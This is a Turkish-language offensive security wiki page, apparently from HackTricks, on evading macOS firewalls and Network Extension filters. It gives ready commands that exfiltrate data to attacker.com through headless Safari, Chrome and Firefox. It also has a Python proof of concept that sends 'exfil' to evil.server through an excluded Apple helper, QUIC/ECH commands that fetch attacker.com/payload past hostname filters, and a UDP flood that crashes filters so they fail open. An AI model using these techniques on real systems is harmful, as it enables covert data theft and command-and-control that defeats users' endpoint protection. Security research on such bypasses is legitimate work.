# macOS Güvenlik Duvarlarını Atlatma

{{#include ../../banners/hacktricks-training.md}}

## Bulunan teknikler

Aşağıdaki tekniklerin bazı macOS firewall uygulamalarında çalıştığı tespit edildi.

### Abusing whitelist names

- Örneğin malware'i iyi bilinen macOS süreçlerinin isimleriyle, örneğin **`launchd`**, çağırmak

### Synthetic Click

- Eğer firewall kullanıcıdan izin istiyorsa, malware'in **click on allow** yapmasını sağla

### **Use Apple signed binaries**

- Örneğin **`curl`**, ama ayrıca **`whois`** gibi diğerleri de

### Well known apple domains

Firewall iyi bilinen apple alanlarına (ör. **`apple.com`**, **`icloud.com`**) yapılan bağlantılara izin veriyor olabilir. iCloud bir C2 olarak kullanılabilir.

### Generic Bypass

Firewall'ları atlatmayı denemek için bazı fikirler

### Check allowed traffic

İzin verilen trafiği bilmek, potansiyel olarak whitelist'te olan alan adlarını veya hangi uygulamaların onlara erişmesine izin verildiğini belirlemenize yardımcı olur
```bash
lsof -i TCP -sTCP:ESTABLISHED
```
### DNS Kötüye Kullanımı

DNS çözümlemeleri muhtemelen DNS sunucularıyla iletişim kurmasına izin verilecek imzalı **`mdnsreponder`** uygulaması aracılığıyla yapılır.

<figure><img src="../../images/image (468).png" alt="https://www.youtube.com/watch?v=UlT5KFTMn2k"><figcaption></figcaption></figure>

### Tarayıcı uygulamaları aracılığıyla

- **oascript**
```applescript
tell application "Safari"
run
tell application "Finder" to set visible of process "Safari" to false
make new document
set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
end tell
```
- Google Chrome
```bash
"Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
```
- Firefox
```bash
firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
```
- Safari
```bash
open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
```
### Via processes injections

Eğer herhangi bir sunucuya bağlanmasına izin verilen bir sürece **inject code into a process** gerçekleştirebiliyorsanız, güvenlik duvarı korumalarını atlayabilirsiniz:


{{#ref}}
macos-proces-abuse/
{{#endref}}

---

## Son macOS firewall bypass zafiyetleri (2023-2025)

### Web content filter (Screen Time) bypass – **CVE-2024-44206**
Temmuz 2024'te Apple, Screen Time ebeveyn denetimlerinde kullanılan sistem genelindeki “Web content filter”i bozan kritik bir bug'ı Safari/WebKit'te düzeltti.
Özel hazırlanmış bir URI (ör. örneğin çift URL-encoded “://” ile) Screen Time ACL tarafından tanınmıyor ancak WebKit tarafından kabul ediliyor; bu yüzden istek filtrelenmeden gönderiliyor. Bir URL açabilen herhangi bir process (sandboxed veya unsigned code dahil) bu nedenle kullanıcı veya bir MDM profili tarafından açıkça engellenmiş domainlere ulaşabiliyor.

Pratik test (patch uygulanmamış sistem):
```bash
open "http://attacker%2Ecom%2F./"   # should be blocked by Screen Time
# if the patch is missing Safari will happily load the page
```
### Erken macOS 14 “Sonoma”'daki Packet Filter (PF) kural sıralama hatası
macOS 14 beta sürecinde Apple, **`pfctl`** etrafındaki kullanıcı alanı wrapper'ında bir gerileme (regression) getirdi.
`quick` anahtarı ile eklenen kurallar (birçok VPN kill-switch tarafından kullanılır) sessizce göz ardı edildi, bu da VPN/firewall GUI'si *blocked* rapor etse bile trafik leaks oluşmasına neden oldu. Hata birkaç VPN satıcısı tarafından doğrulandı ve RC 2 (build 23A344)'te düzeltildi.

Hızlı leak-check:
```bash
pfctl -sr | grep quick       # rules are present…
sudo tcpdump -n -i en0 not port 53   # …but packets still leave the interface
```
### Apple tarafından imzalanmış yardımcı servislerin kötüye kullanımı (legacy – pre-macOS 11.2)
macOS 11.2'den önce **`ContentFilterExclusionList`**, **`nsurlsessiond`** gibi ~50 Apple binaries'inin ve App Store'un Network Extension framework ile uygulanmış tüm socket-filter firewalls'larını atlamasına izin veriyordu (LuLu, Little Snitch, vb.).
Malware basitçe hariç tutulmuş bir process başlatabilir—ya da içine kod enjekte edebilir—ve kendi trafiğini zaten izin verilen socket üzerinden tünelleyebilirdi. Apple, macOS 11.2'de hariç tutma listesini tamamen kaldırdı, ancak bu teknik yükseltilemeyen sistemlerde hâlâ geçerli.

Örnek proof-of-concept (pre-11.2):
```python
import subprocess, socket
# Launch excluded App Store helper (path collapsed for clarity)
subprocess.Popen(['/System/Applications/App\\ Store.app/Contents/MacOS/App Store'])
# Connect through the inherited socket
s = socket.create_connection(("evil.server", 443))
s.send(b"exfil...")
```
### QUIC/ECH ile Network Extension domain filtrelerinden kaçınma (macOS 12+)
NEFilter Packet/Data Providers, TLS ClientHello SNI/ALPN'e dayanır. **HTTP/3 over QUIC (UDP/443)** ve **Encrypted Client Hello (ECH)** ile SNI şifreli kalır, NetExt akışı çözümlleyemez ve hostname kuralları sıklıkla fail-open olur; böylece malware DNS'e dokunmadan engellenmiş domain'lere ulaşabilir.

Minimal PoC:
```bash
# Chrome/Edge – force HTTP/3 and ECH
/Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome \
--enable-quic --origin-to-force-quic-on=attacker.com:443 \
--enable-features=EncryptedClientHello --user-data-dir=/tmp/h3test \
https://attacker.com/payload

# cURL 8.10+ built with quiche
curl --http3-only https://attacker.com/payload
```
If QUIC/ECH is still enabled this is an easy hostname-filter evasion path.

### macOS 15 “Sequoia” Network Extension kararsızlığı (2024–2025)
Erken 15.0/15.1 build'ları üçüncü taraf **Network Extension** filtrelerini (LuLu, Little Snitch, Defender, SentinelOne, vb.) çökertiyor. Filtre yeniden başlatıldığında macOS flow rules'larını temizliyor ve birçok ürün fail‑open oluyor. Filtreyi binlerce kısa UDP flows ile floodlamak (veya QUIC/ECH'yi zorlamak) çöküşü tekrar tekrar tetikleyebilir ve GUI hâlâ firewall'ın çalıştığını iddia ederken C2/exfil için bir pencere bırakabilir.

Hızlı yeniden üretme (güvenli lab kutusu):
```bash
# create many short UDP flows to exhaust NE filter queues
python3 - <<'PY'
import socket, os
for i in range(5000):
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(b'X'*32, ('1.1.1.1', 53))
PY
# watch for NetExt crash / reconnect loop
log stream --predicate 'subsystem == "com.apple.networkextension"' --style syslog
```
---

## Modern macOS için araç ipuçları

1. GUI firewalls tarafından oluşturulan mevcut PF kurallarını inceleyin:
```bash
sudo pfctl -a com.apple/250.ApplicationFirewall -sr
```
2. Zaten *outgoing-network* entitlement'ına sahip binary'leri listeleyin (piggy-backing için kullanışlı):
```bash
codesign -d --entitlements :- /path/to/bin 2>/dev/null \
| plutil -extract com.apple.security.network.client xml1 -o - -
```
3. Objective-C/Swift kullanarak programatik olarak kendi Network Extension content filter'ınızı kaydedin.
Paketleri yerel bir sokete ileten rootless minimal bir PoC Patrick Wardle’ın **LuLu** kaynak kodunda mevcuttur.

## Kaynaklar

- [https://www.youtube.com/watch?v=UlT5KFTMn2k](https://www.youtube.com/watch?v=UlT5KFTMn2k)
- <https://nosebeard.co/advisories/nbl-001.html>
- <https://thehackernews.com/2021/01/apple-removes-macos-feature-that.html>
- <https://www.securityweek.com/cybersecurity-products-conking-out-after-macos-sequoia-update/>
- <https://learn.microsoft.com/en-us/defender-endpoint/network-protection-macos>

{{#include ../../banners/hacktricks-training.md}}
